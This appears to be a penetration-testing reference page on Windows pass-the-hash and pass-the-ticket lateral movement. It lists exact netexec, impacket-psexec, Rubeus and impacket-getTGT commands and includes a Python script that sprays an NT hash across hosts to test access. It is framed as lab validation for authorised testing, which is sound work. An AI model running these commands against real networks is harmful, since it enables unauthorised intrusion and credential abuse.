# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`windows-lateral-movement-pass-the-hash-and-ticket`](SKILL.md) | Family: **Network, Active Directory and Endpoint**

Entry points verified against current releases. Impacket, Certipy and netexec rename subcommands between minor versions; check `--help` before scripting.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `netexec` | `netexec smb 10.20.30.21 -u Administrator -H <hash> --shares` | Test hash applicability per host | Linux / Windows |
| `impacket-psexec` | `impacket-psexec -hashes :<hash> administrator@10.20.30.21` | Hash-based execution, lab only | Linux / Windows |
| `Rubeus` | `Rubeus.exe ptt /ticket:<base64>` | Inject a ticket into the current session | Windows |
| `klist` | `klist -e -f` | Inspect cached tickets and encryption types | Windows |
| `impacket-getTGT` | `impacket-getTGT corp.example/user -hashes :<hash> -dc-ip 10.20.30.10` | Convert a hash into a TGT, lab only | Linux / Windows |

## Minimal Lab Validation Script

Prove applicability with one second-host authentication per credential class; no further movement is attempted.

```python
import subprocess

def try_hash(host, user, nthash):
    out = subprocess.run(["netexec", "smb", host, "-u", user, "-H", nthash, "--shares"],
                         capture_output=True, text=True).stdout
    return "Pwn3d!" in out or "READ" in out or "WRITE" in out, out.strip().splitlines()[-1:]

for host in ("10.20.30.20", "10.20.30.21"):
    ok, tail = try_hash(host, "Administrator", "<nthash>")
    print(host, "authenticated", ok, tail)
```

## Flag Notes

- `--shares` proves authorised access, not just authentication, which is the stronger evidence.
- -H` takes the NT hash with an empty LM component, formatted as `:hash` in impacket.
- `ptt` injects a ticket into the current logon session; lab only and reversible by logoff.
